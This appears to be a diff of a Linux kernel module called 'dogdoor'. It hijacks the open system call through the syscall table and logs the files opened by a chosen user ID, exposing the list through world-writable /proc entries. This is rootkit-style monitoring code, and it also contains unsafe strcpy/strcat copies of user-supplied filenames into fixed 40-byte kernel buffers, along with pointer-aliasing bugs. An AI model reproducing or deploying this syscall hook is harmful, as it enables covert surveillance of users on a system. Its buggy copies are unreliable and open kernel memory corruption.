@@ -8,15 +8,15 @@
 #include <linux/kernel.h>
 #include <linux/cred.h>
 #include <linux/types.h>
-#include <linux/fs.h>
-#include <linux/buffer_head.h>
+#include <linux/slab.h>
+
 #include <asm/unistd.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
 #define FILENAME_COUNT 10
+#define FILENAME_SIZE 40
 
 MODULE_LICENSE("GPL");
-
 
 char user_uid[128] = "-1";
 void ** sctable ;
@@ -25,86 +25,23 @@ int count_accessed_filenames = 0;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
-struct file *file_open(const char *path, int flags, int rights) 
-{
-    struct file *filp = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-    filp = filp_open(path, flags, rights);
-    set_fs(oldfs);
-    if (IS_ERR(filp)) {
-        err = PTR_ERR(filp);
-        return NULL;
-    }
-    return filp;
-}
-
-void file_close(struct file *file) 
-{
-        filp_close(file, NULL);
-}
-
-int file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
-{
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_read(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}  
-
-int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
-{
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_write(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}
-
-int file_sync(struct file *file) 
-{
-    vfs_fsync(file, 0);
-    return 0;
-}
-
 static
-void print_filenames(void) {
-    int i;
-    for (i=0; i<FILENAME_COUNT; i++) {
-        if (accessed_filenames[i] != NULL) {
-            printk("ACCESSED FILE (%d) : %s\n", i, accessed_filenames[i]);
+void init_filenames(const char __user * filename) {
+    /*char * is_in_slash = kmalloc(FILENAME_SIZE, GFP_KERNEL);*/
+    /*is_in_slash = strstr(filename, "/");*/
+    /*if (is_in_slash == NULL) {*/
+        if (count_accessed_filenames < FILENAME_COUNT) {
+            strcpy(accessed_filenames[count_accessed_filenames], filename);
+            count_accessed_filenames++;
+        } else {
+            int i;
+            for (i=0; i<FILENAME_COUNT - 1; i++) {
+                accessed_filenames[i] = accessed_filenames[i+1];
+            }
+            strcpy(accessed_filenames[FILENAME_COUNT - 1], filename);
         }
-    }
-}
-
-static
-void init_filenames(char __user * filename) {
-    if (count_accessed_filenames < FILENAME_COUNT) {
-        /*accessed_filenames[count_accessed_filenames] = filename;*/
-        printk("XXXXXXXXXXXXXX\n");
-        count_accessed_filenames++;
-    } else {
-        int i;
-        for (i=0; i<9; i++) {
-            accessed_filenames[i] = accessed_filenames[i+1];
-        }
-        /*accessed_filenames[9] = filename;*/
-        printk("YYYYYYYYYYYYYY\n");
-    }
+    /*}*/
+    /*kfree(is_in_slash);*/
 }
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
@@ -117,39 +54,31 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
     int i_user_uid = (int)simple_strtol(user_uid, NULL, 10);
 
     if (my_cred->uid.val == i_user_uid && i_user_uid != -1) {
-        /*struct file * ftest = file_open("/var/log/test.log", O_WRONLY|O_CREAT, 0644);*/
-        /*file_write(ftest, 0, "testtest", 8);*/
-        /*file_close(ftest);*/
         init_filenames(filename);
-        printk("FILE: %s, Current UID: %d, Current EUID: %d\n", filename, my_cred->uid, my_cred->euid);
-        print_filenames();
     }
 
 	return orig_sys_open(filename, flags, mode) ;
 }
-
 
 static
 ssize_t dogdoor_log_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
 	ssize_t toread ;
     int i;
+    char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);
 
-    accessed_filenames[0] = "TESTTEST\n";
-
-    for(i=0; i<FILENAME_COUNT; i++) {
-        if (accessed_filenames[i] != NULL){
-            toread = strlen(accessed_filenames[i]) >= *offset + size ? size : strlen(accessed_filenames[i]) - *offset ;
-            if (copy_to_user(ubuf, accessed_filenames[i]+ *offset, toread))
-                return -EFAULT ;	
-            *offset = *offset + toread ;
-        }
+    strcpy(cattest, "LASTLY ACCESSED FILES:");
+    strcat(cattest, "\n");
+    for (i=0; i<FILENAME_COUNT; i++) {
+        strcat(cattest, "\n");
+        strcat(cattest, accessed_filenames[i]);
     }
+    toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
+    if (copy_to_user(ubuf, cattest+ *offset, toread))
+        return -EFAULT ;	
+    *offset = *offset + toread ;
 
-	/*toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;*/
-	/*if (copy_to_user(ubuf, buf + *offset, toread))*/
-		/*return -EFAULT ;	*/
-	/**offset = *offset + toread ;*/
+    kfree(cattest);
 	return toread ;
 }
 
@@ -226,6 +155,12 @@ static
 int __init dogdoor_init(void) {
 	unsigned int level ; 
 	pte_t * pte ;
+
+    int i;
+    for (i=0; i<FILENAME_COUNT; i++) {
+        accessed_filenames[i] = kmalloc(FILENAME_SIZE, GFP_KERNEL);
+        strcpy(accessed_filenames[i], "(EMTPY)");
+    }
 
 	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
 	proc_create("dogdoor_log", S_IRUGO | S_IWUGO, NULL, &dogdoor_log_fops) ;
